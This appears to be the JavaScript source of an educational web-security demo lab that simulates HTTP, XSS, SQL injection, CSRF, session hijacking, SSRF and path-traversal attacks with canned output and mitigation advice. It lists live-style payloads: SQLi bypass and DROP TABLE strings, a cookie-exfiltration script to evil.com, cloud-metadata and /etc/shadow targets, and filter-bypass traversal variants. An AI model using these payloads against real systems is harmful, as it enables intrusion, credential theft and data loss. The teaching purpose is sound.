/* ============================================================
   http/app.js — Demo Lab: HTTP/HTTPS
   Protocolos Red SOC · @xavimape
   Demos: 1) HTTP Request/Response simulator
          2) XSS (sanitized vs unsanitized)
          3) SQL Injection visualizer
   ============================================================ */

'use strict';

const httpDemo = (function () {

  function createLogger(id) { const el=document.getElementById(id); return el ? SOC.createLogger(el) : { log: async()=>{}, clear:()=>{} }; }

  const t = (es, en) => (typeof i18n !== 'undefined' && i18n.getLang() === 'en') ? en : es;

  // ─── Simulador Request/Response HTTP ─────────────────────────────

  const HTTP_SCENARIOS = {
    'GET': {
      'https://bank.example.com/login': {
        status: '200 OK',
        headers: {
          'Content-Type':              'text/html; charset=utf-8',
          'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
          'X-Frame-Options':           'DENY',
          'X-Content-Type-Options':    'nosniff',
          'Content-Security-Policy':   "default-src 'self'",
        },
        body: '<html><body><!-- Login form --></body></html>',
        type: 'success',
      },
      'https://bank.example.com/dashboard': {
        status: '302 Found',
        headers: {
          'Location': '/login',
          'Set-Cookie': 'session=; Max-Age=0; Secure; HttpOnly',
        },
        body: 'Redireccionando a /login...',
        type: 'warning',
      },
    },
    'POST': {
      'https://bank.example.com/login': {
        status: '200 OK',
        headers: {
          'Content-Type': 'application/json',
          'Set-Cookie':   'session=a1b2c3d4e5f6; HttpOnly; Secure; SameSite=Strict',
        },
        body: '{"status":"ok","redirect":"/dashboard"}',
        type: 'success',
      },
    },
    'DELETE': {
      'https://bank.example.com/login': {
        status: '405 Method Not Allowed',
        headers: {
          'Allow': 'GET, POST',
          'Content-Type': 'application/json',
        },
        body: '{"error":"Method not allowed"}',
        type: 'danger',
      },
    },
    'PUT': {
      'https://bank.example.com/login': {
        status: '401 Unauthorized',
        headers: {
          'WWW-Authenticate': 'Bearer realm="bank"',
          'Content-Type':     'application/json',
        },
        body: '{"error":"Unauthorized — token required"}',
        type: 'danger',
      },
    },
  };

  const DEFAULT_RESPONSE = {
    status: '200 OK',
    headers: { 'Content-Type': 'application/json', 'X-Proto-Note': 'simulated response' },
    body: '{"status":"ok"}',
    type: 'success',
  };

  async function sendRequest() {
    const url    = document.getElementById('http-url').value.trim();
    const method = document.getElementById('http-method').value;
    const body   = document.getElementById('http-body').value.trim();
    const out    = document.getElementById('http-output');

    // Limpiar output
    out.innerHTML = '';
    const logger = SOC.createLogger(out);

    // Mostrar request
    await logger.log(`▶ ${method} ${url} HTTP/1.1`, 'info', 0);
    await logger.log(`Host: ${new URL(url.startsWith('http') ? url : 'https://' + url).hostname}`, 'muted', 80);
    await logger.log('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'muted', 80);
    if (method === 'POST' && body) {
      await logger.log(`Content-Type: application/x-www-form-urlencoded`, 'muted', 80);
      await logger.log(`Content-Length: ${body.length}`, 'muted', 80);
      await logger.log('', 'muted', 80);
      await logger.log(body, 'warning', 100);
    }

    await logger.log('', 'muted', 200);
    await logger.log(t('── Enviando... ──────────────────────────────────', '── Sending... ────────────────────────────────────'), 'muted', 300);
    await logger.log('', 'muted', 500);

    // Buscar respuesta simulada
    const normalizedUrl = url.replace(/\/+$/, '').split('?')[0];
    const scenario = (HTTP_SCENARIOS[method] || {})[normalizedUrl] || DEFAULT_RESPONSE;

    // Mostrar response
    await logger.log(`← HTTP/1.1 ${scenario.status}`, scenario.type, 0);
    for (const [k, v] of Object.entries(scenario.headers)) {
      await logger.log(`${k}: ${v}`, 'muted', 60);
    }
    await logger.log('', 'muted', 80);
    await logger.log(scenario.body, 'success', 100);

    // Notas de seguridad para headers relevantes
    if (scenario.headers['Set-Cookie']) {
      await logger.log('', 'muted', 200);
      await logger.log(t('── Análisis de seguridad ────────────────────────', '── Security analysis ─────────────────────────────'), 'muted', 0);
      const cookie = scenario.headers['Set-Cookie'];
      await logger.log(
        t(`Cookie: ${cookie.includes('HttpOnly') ? '✓ HttpOnly' : '✗ NO HttpOnly (vulnerable XSS)'}`, `Cookie: ${cookie.includes('HttpOnly') ? '✓ HttpOnly' : '✗ NO HttpOnly (XSS-vulnerable)'}`),
        cookie.includes('HttpOnly') ? 'success' : 'danger', 100
      );
      await logger.log(
        t(`Cookie: ${cookie.includes('Secure') ? '✓ Secure (solo HTTPS)' : '✗ NO Secure (viaja por HTTP)'}`, `Cookie: ${cookie.includes('Secure') ? '✓ Secure (HTTPS only)' : '✗ NO Secure (travels over HTTP)'}`),
        cookie.includes('Secure') ? 'success' : 'danger', 100
      );
      await logger.log(
        t(`Cookie: ${cookie.includes('SameSite') ? '✓ SameSite (protección CSRF)' : '✗ NO SameSite'}`, `Cookie: ${cookie.includes('SameSite') ? '✓ SameSite (CSRF protection)' : '✗ NO SameSite'}`),
        cookie.includes('SameSite') ? 'success' : 'warning', 100
      );
    }

    if (method === 'POST' && body.includes('password')) {
      await logger.log('', 'muted', 200);
      await logger.log(
        url.startsWith('https') ? t('✓ Tráfico cifrado con TLS — credenciales protegidas','✓ Traffic encrypted with TLS — credentials protected') : t('⚠️  HTTP plano — contraseña visible en tránsito','⚠️  Plain HTTP — password visible in transit'),
        url.startsWith('https') ? 'success' : 'danger', 100
      );
    }
  }

  // ─── Demo XSS ─────────────────────────────────────────────────────

  function sanitize(input) {
    return input
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  }

  async function runXSS() {
    const raw    = document.getElementById('xss-input').value;
    const unsafe = document.getElementById('xss-output-unsafe');
    const safe   = document.getElementById('xss-output-safe');
    const log    = document.getElementById('xss-log');

    const logger = SOC.createLogger(log);

    // Mostrar payload crudo en el div "unsafe" como texto (no lo ejecutamos realmente)
    unsafe.textContent = raw;

    // Mostrar versión sanitizada
    const sanitized = sanitize(raw);
    safe.textContent = sanitized;

    // Log del análisis
    await logger.log(t('── Analizando payload ────────────────────────', '── Analyzing payload ─────────────────────────'), 'muted', 0);

    const hasScript  = /<script/i.test(raw);
    const hasHandler = /on\w+\s*=/i.test(raw);
    const hasHref    = /javascript:/i.test(raw);

    if (hasScript)  await logger.log(t('⚠️  Detectado: <script> tag → ejecución de JS', '⚠️  Detected: <script> tag → JS execution'), 'danger', 200);
    if (hasHandler) await logger.log(t('⚠️  Detectado: event handler (onload/onerror...)', '⚠️  Detected: event handler (onload/onerror...)'), 'danger', 200);
    if (hasHref)    await logger.log(t('⚠️  Detectado: javascript: URI scheme', '⚠️  Detected: javascript: URI scheme'), 'danger', 200);

    if (!hasScript && !hasHandler && !hasHref) {
      await logger.log(t('✓ No se detectaron vectores XSS en el input', '✓ No XSS vectors detected in the input'), 'success', 200);
    }

    await logger.log('', 'muted', 300);
    await logger.log(t('► Sin sanitizar: el payload se ejecutaría en el browser', '► Unsanitized: the payload would run in the browser'), 'danger', 0);
    await logger.log(t('► Sanitizado:    tags convertidos a entidades HTML — inofensivo', '► Sanitized:     tags converted to HTML entities — harmless'), 'success', 200);
    await logger.log(t(`   Input original (${raw.length} chars) → HTML-encoded (${sanitized.length} chars)`, `   Original input (${raw.length} chars) → HTML-encoded (${sanitized.length} chars)`), 'muted', 100);
  }

  // ─── Demo SQL Injection ────────────────────────────────────────────

  const SQLI_PAYLOADS = {
    bypass:   { user: "admin' --",                                              pass: 'cualquier_cosa' },
    or1:      { user: "' OR '1'='1",                                            pass: "' OR '1'='1" },
    union:    { user: "' UNION SELECT username,password FROM users --",         pass: '' },
    blind:    { user: "admin' AND SUBSTRING(password,1,1)='a' --",              pass: 'x' },
    time:     { user: "admin'; WAITFOR DELAY '0:0:3' --",                       pass: 'x' },
    drop:     { user: "'; DROP TABLE users; --",                                pass: '' },
    legit:    { user: 'john.doe',                                               pass: 'C0rr3ctP@ss!' },
  };

  function loadSQLiVariant() {
    const v = document.getElementById('sqli-variant')?.value;
    const p = SQLI_PAYLOADS[v];
    if (!p) return;
    document.getElementById('sqli-user').value = p.user;
    document.getElementById('sqli-pass').value = p.pass;
  }

  async function runSQLi() {
    const user  = document.getElementById('sqli-user').value;
    const pass  = document.getElementById('sqli-pass').value;
    const out   = document.getElementById('sqli-output');
    out.innerHTML = '';
    const logger = SOC.createLogger(out);

    // Construir la query "vulnerable"
    const query = `SELECT * FROM users WHERE user='${user}' AND password='${pass}'`;

    await logger.log(t('── Query generada ────────────────────────────', '── Generated query ───────────────────────────'), 'muted', 0);
    await logger.log(query, 'warning', 100);
    await logger.log('', 'muted', 200);

    // Detectar payload
    const isComment  = user.includes('--') || user.includes('/*');
    const isUnion    = /UNION\s+SELECT/i.test(user);
    const isDrop     = /DROP\s+(TABLE|DATABASE)/i.test(user);
    const isOrAlways = /OR\s+['"]?1['"]?\s*=\s*['"]?1/i.test(user);
    const isBlind    = /AND\s+\w+\s*\(/i.test(user) || /SUBSTRING|ASCII|CHAR\(/i.test(user);
    const isTimeBased = /SLEEP\s*\(|WAITFOR\s+DELAY|BENCHMARK\s*\(|pg_sleep\s*\(/i.test(user);

    if (isDrop) {
      await logger.log(t('🔴 TIPO: Destructivo — DDL Injection', '🔴 TYPE: Destructive — DDL Injection'), 'danger', 0);
      await logger.log('   MITRE ATT&CK: T1485 — Data Destruction', 'warning', 100);
      await logger.log('', 'muted', 50);
      await logger.log(t('   La tabla users sería eliminada permanentemente', '   The users table would be permanently deleted'), 'danger', 100);
      await logger.log(t('   → Pérdida total de datos + DoS de la aplicación', '   → Total data loss + application DoS'), 'danger', 100);
      await logger.log('', 'muted', 100);
      await logger.log(t('   Query efectiva:', '   Effective query:'), 'warning', 0);
      await logger.log("   SELECT * FROM users WHERE user=''; DROP TABLE users;--", 'warning', 100);
      await logger.log(t('🚨 RESULTADO: Base de datos destruida', '🚨 RESULT: Database destroyed'), 'danger', 200);
    } else if (isTimeBased) {
      await logger.log(t('🔴 TIPO: Time-Based Blind SQLi', '🔴 TYPE: Time-Based Blind SQLi'), 'danger', 0);
      await logger.log('   MITRE ATT&CK: T1190 — Exploit Public-Facing App', 'warning', 100);
      await logger.log('', 'muted', 50);
      await logger.log(t('   El atacante infiere datos por el tiempo de respuesta:', '   The attacker infers data from the response time:'), 'danger', 100);
      await logger.log(t("   Si delay > 3s → condición TRUE → el char es correcto", "   If delay > 3s → condition TRUE → the char is correct"), 'danger', 100);
      await logger.log('', 'muted', 100);
      await logger.log(t('   Técnica: reconstruye datos 1 char a la vez', '   Technique: reconstructs data 1 char at a time'), 'warning', 100);
      await logger.log("   admin'; IF (SUBSTRING(password,1,1)='a') WAITFOR DELAY '0:0:3'--", 'warning', 100);
      await logger.log('', 'muted', 100);
      await logger.log(t('⏱️  RESULTADO: Respuesta demorada ~3s → char confirmado', '⏱️  RESULT: Response delayed ~3s → char confirmed'), 'danger', 200);
      await logger.log(t('⚠️  Difícil de detectar: no hay error visible ni datos expuestos', '⚠️  Hard to detect: no visible error or exposed data'), 'warning', 200);
    } else if (isBlind) {
      await logger.log(t('🔴 TIPO: Boolean-Based Blind SQLi', '🔴 TYPE: Boolean-Based Blind SQLi'), 'danger', 0);
      await logger.log('   MITRE ATT&CK: T1190 — Exploit Public-Facing App', 'warning', 100);
      await logger.log('', 'muted', 50);
      await logger.log(t('   El atacante infiere datos por TRUE/FALSE de la respuesta:', '   The attacker infers data from TRUE/FALSE of the response:'), 'danger', 100);
      await logger.log(t("   Query TRUE  → login exitoso (200 OK)", "   Query TRUE  → login successful (200 OK)"), 'danger', 100);
      await logger.log(t("   Query FALSE → login falla (401)", "   Query FALSE → login fails (401)"), 'danger', 100);
      await logger.log('', 'muted', 100);
      await logger.log("   admin' AND SUBSTRING(password,1,1)='a' --", 'warning', 100);
      await logger.log(t("   → Si 200: primer char de password es 'a'", "   → If 200: first char of password is 'a'"), 'warning', 100);
      await logger.log('', 'muted', 100);
      await logger.log(t('⚠️  RESULTADO: Sin output directo — exfiltración bit a bit', '⚠️  RESULT: No direct output — bit-by-bit exfiltration'), 'danger', 200);
      await logger.log(t('⚠️  Herramientas: sqlmap --technique=B automatiza esto', '⚠️  Tools: sqlmap --technique=B automates this'), 'warning', 200);
    } else if (isUnion) {
      await logger.log(t('🔴 TIPO: UNION-Based SQLi — extracción de datos', '🔴 TYPE: UNION-Based SQLi — data extraction'), 'danger', 0);
      await logger.log('   MITRE ATT&CK: T1005 — Data from Local System', 'warning', 100);
      await logger.log('', 'muted', 50);
      await logger.log(t('   Condición: nº de columnas debe coincidir con la query original', '   Condition: number of columns must match the original query'), 'warning', 100);
      await logger.log("   Query efectiva:", 'warning', 100);
      await logger.log("   SELECT * FROM users WHERE user='' UNION SELECT username,password FROM users --", 'warning', 100);
      await logger.log('', 'muted', 100);
      await logger.log(t('🚨 RESULTADO: Volcado completo de tabla users en la respuesta', '🚨 RESULT: Full dump of users table in the response'), 'danger', 200);
      await logger.log(t('   → hashes de contraseñas, emails, roles expuestos', '   → password hashes, emails, roles exposed'), 'danger', 100);
    } else if (isComment && !isOrAlways) {
      await logger.log(t('🔴 TIPO: Auth Bypass — Comment Injection', '🔴 TYPE: Auth Bypass — Comment Injection'), 'danger', 0);
      await logger.log('   MITRE ATT&CK: T1078 — Valid Accounts (via bypass)', 'warning', 100);
      await logger.log('', 'muted', 50);
      await logger.log(t("   El '--' comenta todo lo que sigue en la query", "   The '--' comments out everything after it in the query"), 'danger', 100);
      await logger.log(t('   → La verificación de contraseña es ignorada por completo', '   → Password verification is completely bypassed'), 'danger', 100);
      await logger.log('', 'muted', 100);
      await logger.log(t('   Query efectiva ejecutada:', '   Effective query executed:'), 'warning', 0);
      await logger.log(t(`   SELECT * FROM users WHERE user='admin'  ← fin, sin AND password`, `   SELECT * FROM users WHERE user='admin'  ← end, no AND password`), 'warning', 100);
      await logger.log('', 'muted', 100);
      await logger.log(t('🚨 RESULTADO: Login exitoso como admin SIN contraseña', '🚨 RESULT: Login successful as admin WITHOUT password'), 'danger', 200);
    } else if (isOrAlways) {
      await logger.log(t("🔴 TIPO: Boolean Always-True — OR '1'='1'", "🔴 TYPE: Boolean Always-True — OR '1'='1'"), 'danger', 0);
      await logger.log('   MITRE ATT&CK: T1078 — Valid Accounts (via bypass)', 'warning', 100);
      await logger.log('', 'muted', 50);
      await logger.log(t('   La condición WHERE siempre evalúa TRUE', '   The WHERE condition always evaluates TRUE'), 'danger', 100);
      await logger.log(t("   WHERE user='' OR '1'='1' → retorna TODAS las filas", "   WHERE user='' OR '1'='1' → returns ALL rows"), 'danger', 100);
      await logger.log('', 'muted', 100);
      await logger.log(t('🚨 RESULTADO: Retorna primer usuario (generalmente admin)', '🚨 RESULT: Returns first user (usually admin)'), 'danger', 200);
      await logger.log(t('   → Login exitoso + potencial exposición de todos los users', '   → Successful login + potential exposure of all users'), 'danger', 100);
    } else {
      // Input legítimo
      const valid = user.length > 2 && pass.length >= 6 && !user.includes("'");
      await logger.log(t('✓ Input sin caracteres especiales SQL', '✓ Input without special SQL characters'), 'success', 0);
      await logger.log('', 'muted', 100);
      await logger.log(t('── Resultado ─────────────────────────────────', '── Result ────────────────────────────────────'), 'muted', 0);
      if (valid) {
        await logger.log(t(`✓ Usuario "${user}" encontrado`, `✓ User "${user}" found`), 'success', 200);
        await logger.log(t('✓ Contraseña verificada (hash bcrypt)', '✓ Password verified (bcrypt hash)'), 'success', 200);
        await logger.log(t('✓ Login exitoso → session token generado', '✓ Login successful → session token generated'), 'success', 200);
      } else {
        await logger.log(t('✗ Credenciales incorrectas → 401 Unauthorized', '✗ Invalid credentials → 401 Unauthorized'), 'warning', 200);
      }
      return;
    }

    await logger.log('', 'muted', 200);
    await logger.log(t('── Cómo prevenirlo ───────────────────────────', '── How to prevent it ─────────────────────────'), 'muted', 0);
    await logger.log('  Prepared Statement (Python):', 'info', 100);
    await logger.log("  cursor.execute('SELECT * FROM users WHERE user=? AND password=?', (user, pass))", 'muted', 100);
    await logger.log(t('  → El input nunca se interpreta como SQL', '  → The input is never interpreted as SQL'), 'success', 100);
  }

  async function resetSQLi() {
    const sel = document.getElementById('sqli-variant');
    if (sel) sel.value = 'legit';
    document.getElementById('sqli-user').value = SQLI_PAYLOADS.legit.user;
    document.getElementById('sqli-pass').value = SQLI_PAYLOADS.legit.pass;
    await runSQLi();
  }

  function reset() {
    document.getElementById('http-url').value    = 'https://bank.example.com/login';
    document.getElementById('http-method').value = 'POST';
    document.getElementById('http-body').value   = 'username=admin&password=secret123';
    const out = document.getElementById('http-output');
    out.innerHTML = '<div class="log-line"><span class="log-time">[→]</span><span class="log-info">Esperando request HTTP...</span></div>';
  }

  // ─── Demo 4: CSRF ─────────────────────────────────────────────
  async function runCSRFLegit() {
    const amount = document.getElementById('csrf-amount')?.value || '500';
    const dest   = document.getElementById('csrf-dest')?.value   || 'ES76...';
    const out    = document.getElementById('csrf-output');
    if (!out) return;
    const log = SOC.createLogger(out);
    log.clear();

    await log.log(t('── Request legítimo (usuario hace click en su banco) ──', '── Legitimate request (user clicks on their bank) ──'), 'info', 0);
    await log.log('POST /transfer HTTP/1.1', 'data', 200);
    await log.log('Host: bank.example.com', 'data', 100);
    await log.log('Cookie: session=a1b2c3d4; SameSite=Strict', 'data', 100);
    await log.log('Origin: https://bank.example.com', 'data', 100);
    await log.log('Referer: https://bank.example.com/transfer', 'data', 100);
    await log.log(`X-CSRF-Token: f8a3b2c1d4e5f6a7b8c9d0e1f2a3b4c5`, 'ok', 100);
    await log.log('', 'muted', 50);
    await log.log(`amount=${amount}&to=${dest}`, 'data', 200);
    await log.log('', 'muted', 50);
    await log.log(t('✅ Servidor verifica: Origin ✓ · Referer ✓ · CSRF Token ✓', '✅ Server verifies: Origin ✓ · Referer ✓ · CSRF Token ✓'), 'ok', 400);
    await log.log(t(`✅ Transferencia de €${amount} AUTORIZADA`, `✅ Transfer of €${amount} AUTHORIZED`), 'ok', 300);
  }

  async function runCSRFAttack() {
    const amount = document.getElementById('csrf-amount')?.value || '500';
    const out    = document.getElementById('csrf-output');
    if (!out) return;
    const log = SOC.createLogger(out);
    log.clear();

    await log.log(t('── Víctima visita evil.com (ya tiene sesión en bank.example.com) ──', '── Victim visits evil.com (already logged in at bank.example.com) ──'), 'error', 0);
    await log.log(t('<!-- Código oculto en evil.com -->', '<!-- Hidden code on evil.com -->'), 'muted', 300);
    await log.log('<img src="https://bank.example.com/transfer?amount=' + amount + '&to=ATTACKER_ACCT">', 'warn', 300);
    await log.log('', 'muted', 100);
    await log.log(t('── Navegador envía automáticamente ──', '── Browser sends automatically ──'), 'error', 300);
    await log.log('GET /transfer?amount=' + amount + '&to=ATTACKER_ACCT HTTP/1.1', 'error', 200);
    await log.log('Host: bank.example.com', 'data', 100);
    await log.log(t('Cookie: session=a1b2c3d4  ← ¡cookie legítima adjuntada automáticamente!', 'Cookie: session=a1b2c3d4  ← legitimate cookie attached automatically!'), 'error', 100);
    await log.log(t('Origin: https://evil.com  ← origen diferente', 'Origin: https://evil.com  ← different origin'), 'warn', 100);
    await log.log(t('Referer: https://evil.com/page  ← referer externo', 'Referer: https://evil.com/page  ← external referer'), 'warn', 100);
    await log.log(t('X-CSRF-Token: (ausente)', 'X-CSRF-Token: (absent)'), 'error', 100);
    await log.log('', 'muted', 50);
    await log.log(t('── Sin protección CSRF el servidor acepta la request ──', '── Without CSRF protection the server accepts the request ──'), 'error', 400);
    await log.log(t(`🚨 Transferencia de €${amount} EJECUTADA a cuenta atacante`, `🚨 Transfer of €${amount} EXECUTED to attacker account`), 'error', 300);
    await log.log(t('── Mitigaciones ──', '── Mitigations ──'), 'info', 400);
    await log.log('  ✅ CSRF Token (sincronizer pattern)', 'ok', 150);
    await log.log('  ✅ SameSite=Strict en cookies', 'ok', 150);
    await log.log(t('  ✅ Verificar cabecera Origin/Referer', '  ✅ Verify Origin/Referer header'), 'ok', 150);
    await log.log('  ✅ Double Submit Cookie', 'ok', 150);
  }

  // ─── Demo 5: Session Hijacking ────────────────────────────────
  async function runSessionHijack() {
    const httpOnly  = document.getElementById('flag-httponly')?.checked;
    const secure    = document.getElementById('flag-secure')?.checked;
    const samesite  = document.getElementById('flag-samesite')?.checked;
    const out       = document.getElementById('session-output');
    if (!out) return;
    const log = SOC.createLogger(out);
    log.clear();

    const cookie = `Set-Cookie: session=a1b2c3d4e5f6${httpOnly ? '; HttpOnly' : ''}${secure ? '; Secure' : ''}${samesite ? '; SameSite=Strict' : ''}`;

    await log.log(t('── Cookie de sesión configurada ──', '── Session cookie configured ──'), 'info', 0);
    await log.log(cookie, httpOnly && secure ? 'ok' : 'error', 300);
    await log.log('', 'muted', 100);
    await log.log(t('── Vectores de ataque ──', '── Attack vectors ──'), 'info', 300);

    // Vector 1: XSS
    if (!httpOnly) {
      await log.log(t('🚨 XSS: document.cookie accesible desde JS', '🚨 XSS: document.cookie accessible from JS'), 'error', 300);
      await log.log('  <script>fetch("https://evil.com/?c="+document.cookie)</script>', 'error', 200);
    } else {
      await log.log(t('✅ XSS mitigado: HttpOnly bloquea document.cookie', '✅ XSS mitigated: HttpOnly blocks document.cookie'), 'ok', 300);
    }

    // Vector 2: Sniffing
    if (!secure) {
      await log.log(t('🚨 Sniffing: cookie viaja en HTTP plano (sin Secure)', '🚨 Sniffing: cookie travels over plain HTTP (no Secure)'), 'error', 300);
      await log.log(t('  → Atacante en red local puede capturarla con Wireshark', '  → Attacker on local network can capture it with Wireshark'), 'warn', 200);
    } else {
      await log.log(t('✅ Sniffing mitigado: Secure fuerza HTTPS', '✅ Sniffing mitigated: Secure forces HTTPS'), 'ok', 300);
    }

    // Vector 3: CSRF
    if (!samesite) {
      await log.log(t('🚨 CSRF: cookie enviada en requests cross-site', '🚨 CSRF: cookie sent on cross-site requests'), 'error', 300);
    } else {
      await log.log(t('✅ CSRF mitigado: SameSite=Strict bloquea cross-site', '✅ CSRF mitigated: SameSite=Strict blocks cross-site'), 'ok', 300);
    }

    await log.log('', 'muted', 100);
    const risk = (!httpOnly ? 3 : 0) + (!secure ? 2 : 0) + (!samesite ? 1 : 0);
    const levels = [t('✅ Configuración segura','✅ Secure configuration'), t('⚠️ Riesgo bajo','⚠️ Low risk'), t('🚨 Riesgo medio','🚨 Medium risk'), t('🚨 Riesgo alto','🚨 High risk'), t('☠️ Riesgo crítico','☠️ Critical risk'), t('☠️ Riesgo crítico','☠️ Critical risk'), t('☠️ Riesgo máximo','☠️ Maximum risk')];
    const types  = ['ok','warn','warn','error','error','error','error'];
    await log.log(t(`── Veredicto: ${levels[risk]}`, `── Verdict: ${levels[risk]}`), types[risk], 400);
  }

  function resetSession() {
    ['flag-httponly','flag-secure','flag-samesite'].forEach(id => {
      const el = document.getElementById(id);
      if (el) el.checked = true;
    });
    const out = document.getElementById('session-output');
    if (out) out.innerHTML = '<div class="log-line"><span class="log-time">[→]</span><span class="log-info">Configura los flags y analiza...</span></div>';
  }

  // API pública

  function resetSSRF()  { const el=document.getElementById('ssrf-output'); if(el) el.innerHTML=''; }
  function resetLFI()   { const el=document.getElementById('lfi-output');  if(el) el.innerHTML=''; }
  function resetXXE()   { const el=document.getElementById('xxe-output');  if(el) el.innerHTML=''; }

  async function runSSRF() {
    const endpoint = document.getElementById('ssrf-endpoint').value.trim() || 'https://app.empresa.com/fetch?url=';
    const target   = document.getElementById('ssrf-target').value;
    const L = createLogger('ssrf-output');
    L.clear();

    const targets = {
      metadata: { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role', desc: 'AWS EC2 Instance Metadata' },
      internal: { url: 'http://10.0.0.5:8080/api/internal/users', desc: t('API interna sin auth','Internal API without auth') },
      redis:    { url: 'dict://127.0.0.1:6379/info', desc: t('Redis sin autenticación','Redis without authentication') },
      file:     { url: 'file:///etc/passwd', desc: t('Lectura de archivo local','Local file read') }
    };
    const tgt = targets[target];

    await L.log('=== SERVER-SIDE REQUEST FORGERY ===', 'header', 0);
    await L.log(t(`Endpoint vulnerable: ${endpoint}`, `Vulnerable endpoint: ${endpoint}`), 'warn', 100);
    await L.log(t(`Objetivo: ${tgt.desc}`, `Target: ${tgt.desc}`), 'attack', 100);
    await L.log('', 'info', 50);

    await L.log(t('[ PETICIÓN DEL ATACANTE ]', '[ ATTACKER REQUEST ]'), 'header', 200);
    await L.log(`GET ${endpoint}${encodeURIComponent(tgt.url)}`, 'code', 300);
    await L.log(t('→ El servidor hace la petición en nombre del atacante', '→ The server makes the request on behalf of the attacker'), 'warn', 300);
    await L.log('', 'info', 50);

    await L.log(t('[ PETICIÓN INTERNA (servidor → destino) ]', '[ INTERNAL REQUEST (server → target) ]'), 'header', 200);
    await L.log(`GET ${tgt.url}`, 'send', 300);
    await L.log('', 'info', 50);

    if (target === 'metadata') {
      await L.log(t('[ RESPUESTA — IAM Credentials ]', '[ RESPONSE — IAM Credentials ]'), 'header', 300);
      await L.log('HTTP/1.1 200 OK', 'recv', 200);
      await L.log('{', 'recv', 100);
      await L.log('  "Code": "Success",', 'recv', 100);
      await L.log('  "Type": "AWS-HMAC",', 'recv', 100);
      await L.log('  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",', 'attack', 200);
      await L.log('  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENGbPxRfiCYEXAMPLEKEY",', 'attack', 200);
      await L.log('  "Token": "IQoJb3JpZ2luX2VjEJr//////////...",', 'attack', 200);
      await L.log('  "Expiration": "2025-12-31T23:59:59Z"', 'recv', 100);
      await L.log('}', 'recv', 100);
      await L.log('', 'info', 50);
      await L.log(t('⚠ Credenciales IAM obtenidas → acceso a S3, EC2, RDS, Lambda', '⚠ IAM credentials obtained → access to S3, EC2, RDS, Lambda'), 'danger', 300);
    } else if (target === 'internal') {
      await L.log(t('[ RESPUESTA — API interna ]', '[ RESPONSE — Internal API ]'), 'header', 300);
      await L.log('HTTP/1.1 200 OK', 'recv', 200);
      await L.log('[{"id":1,"email":"admin@empresa.com","role":"ADMIN"},', 'attack', 200);
      await L.log(' {"id":2,"email":"cfo@empresa.com","role":"FINANCE"},', 'attack', 150);
      await L.log(' {"id":3,"email":"it@empresa.com","role":"IT_ADMIN"}]', 'attack', 150);
      await L.log('', 'info', 50);
      await L.log(t('⚠ Datos internos expuestos sin autenticación', '⚠ Internal data exposed without authentication'), 'danger', 300);
    } else if (target === 'redis') {
      await L.log(t('[ RESPUESTA — Redis INFO ]', '[ RESPONSE — Redis INFO ]'), 'header', 300);
      await L.log('redis_version:7.0.5', 'recv', 150);
      await L.log('tcp_port:6379', 'recv', 100);
      await L.log('connected_clients:3', 'recv', 100);
      await L.log('used_memory_human:2.50M', 'recv', 100);
      await L.log('', 'info', 50);
      await L.log(t('⚠ Redis accesible → posible SET de comandos → RCE', '⚠ Redis accessible → possible command SET → RCE'), 'danger', 300);
    } else {
      await L.log(t('[ RESPUESTA — /etc/passwd ]', '[ RESPONSE — /etc/passwd ]'), 'header', 300);
      await L.log('root:x:0:0:root:/root:/bin/bash', 'attack', 200);
      await L.log('daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin', 'recv', 100);
      await L.log('www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin', 'recv', 100);
      await L.log('postgres:x:108:117::/var/lib/postgresql:/bin/bash', 'attack', 200);
      await L.log('', 'info', 50);
      await L.log(t('⚠ Archivo local leído — usuarios del sistema expuestos', '⚠ Local file read — system users exposed'), 'danger', 300);
    }

    await L.log('', 'info', 50);
    await L.log('MITRE: T1090 Proxy · T1552.005 Cloud Instance Metadata', 'info', 200);
  }

  async function runLFI() {
    const param  = document.getElementById('lfi-param').value.trim() || '?page=about';
    const target = document.getElementById('lfi-target').value;
    const L = createLogger('lfi-output');
    L.clear();

    const files = {
      passwd: { path: '/etc/passwd',                   traversal: '../../../etc/passwd' },
      shadow: { path: '/etc/shadow',                   traversal: '../../../etc/shadow' },
      config: { path: '/var/www/html/config.php',      traversal: '../../../var/www/html/config.php' },
      logs:   { path: '/var/log/apache2/access.log',   traversal: '../../../var/log/apache2/access.log' }
    };
    const f = files[target];
    const base = 'https://target.com/index.php';

    await L.log('=== PATH TRAVERSAL / LFI ===', 'header', 0);
    await L.log(t(`Parámetro: ${param}`, `Parameter: ${param}`), 'warn', 100);
    await L.log(t(`Objetivo: ${f.path}`, `Target: ${f.path}`), 'attack', 100);
    await L.log('', 'info', 50);

    await L.log(t('[ PAYLOAD BÁSICO ]', '[ BASIC PAYLOAD ]'), 'header', 200);
    await L.log(`GET ${base}${param.split('=')[0]}=${f.traversal}`, 'code', 300);
    await L.log('', 'info', 50);

    await L.log(t('[ BYPASS DE FILTROS ]', '[ FILTER BYPASS ]'), 'header', 200);
    await L.log(`Encoded:     ${base}${param.split('=')[0]}=${f.traversal.replace(/\.\.\//g,'..%2F')}`, 'code', 200);
    await L.log(`Double dot:  ${base}${param.split('=')[0]}=${f.traversal.replace(/\.\.\//g,'..../')}`, 'code', 200);
    await L.log(`Null byte:   ${base}${param.split('=')[0]}=${f.traversal}%00.jpg`, 'code', 200);
    await L.log('', 'info', 50);

    await L.log(t('[ CONTENIDO DEL ARCHIVO ]', '[ FILE CONTENT ]'), 'header', 300);

    if (target === 'passwd') {
      await L.log('root:x:0:0:root:/root:/bin/bash', 'attack', 150);
      await L.log('daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin', 'recv', 100);
      await L.log('www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin', 'recv', 100);
      await L.log('postgres:x:108:117::/var/lib/postgresql:/bin/bash', 'attack', 150);
      await L.log('deploy:x:1001:1001::/home/deploy:/bin/bash', 'attack', 150);
    } else if (target === 'shadow') {
      await L.log(t('Requiere privilegios root para leer /etc/shadow', 'Requires root privileges to read /etc/shadow'), 'warn', 200);
      await L.log('root:$6$rounds=5000$salt$hash...:19000:0:99999:7:::', 'attack', 300);
